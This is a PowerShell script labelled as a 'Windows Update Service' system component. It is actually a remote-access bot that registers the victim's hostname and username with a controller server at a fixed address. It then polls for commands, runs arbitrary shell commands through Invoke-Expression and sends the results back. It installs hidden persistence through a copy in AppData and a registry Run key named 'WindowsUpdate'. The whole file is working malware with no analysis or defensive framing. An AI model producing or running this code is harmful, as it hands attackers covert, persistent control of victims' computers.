# Windows Update Service
# System Component

$global:IP = "192.168.1.14"
$global:PORT = "8000"
$global:ID = -join ((48..57)+(97..102) | Get-Random -Count 8 | % {[char]$_})

function r {
    $b = @{
        bot_id = $global:ID
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = "Windows 10"
        capabilities = @("shell","info","persist")
    } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri "http://$global:IP`:$global:PORT/c2/clear/register" -Method POST -Body $b -ContentType "application/json" | Out-Null
        return $true
    } catch { return $false }
}

function c {
    try {
        $x = Invoke-RestMethod -Uri "http://$global:IP`:$global:PORT/c2/clear/check/$global:ID" -Method GET
        return $x.commands
    } catch { return @() }
}

function s($i,$r) {
    $b = @{cmd_id=$i;result=$r} | ConvertTo-Json
    try { Invoke-RestMethod -Uri "http://$global:IP`:$global:PORT/c2/clear/result/$global:ID" -Method POST -Body $b -ContentType "application/json" | Out-Null } catch {}
}

function e($cmd) {
    try { $o = Invoke-Expression $cmd 2>&1 | Out-String; return $o } catch { return $_.Exception.Message }
}

if (r) {
    while ($true) {
        $cmds = c
        foreach ($cmd in $cmds) {
            $res = switch ($cmd.command) {
                "shell" { e ($cmd.args[0]) }
                "info" { "$env:COMPUTERNAME\$env:USERNAME" }
                "persist" {
                    $p = "$env:APPDATA\Microsoft\Windows\wu.ps1"
                    '$IP="192.168.1.14";$PORT="8000";$ID="' + $global:ID + '"' | Set-Content $p
                    'while($true){try{$c=IRM -Uri "http://' + $global:IP + ':' + $global:PORT + '/c2/clear/check/' + $global:ID + '" -Method GET;foreach($x in $c.commands){$r="";if($x.command -eq "shell"){$r=IEX $x.args[0] 2>&1|Out-String};$b=@{cmd_id=$x.cmd_id;result=$r}|ConvertTo-Json;IRM -Uri "http://' + $global:IP + ':' + $global:PORT + '/c2/clear/result/' + $global:ID + '" -Method POST -Body $b -ContentType "application/json"}Start-Sleep 10}catch{Start-Sleep 10}}' | Add-Content $p
                    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -File $p"
                    "OK"
                }
                "kill" { exit }
                default { "?" }
            }
            s $cmd.cmd_id $res
        }
        Start-Sleep -Seconds 10
    }
}
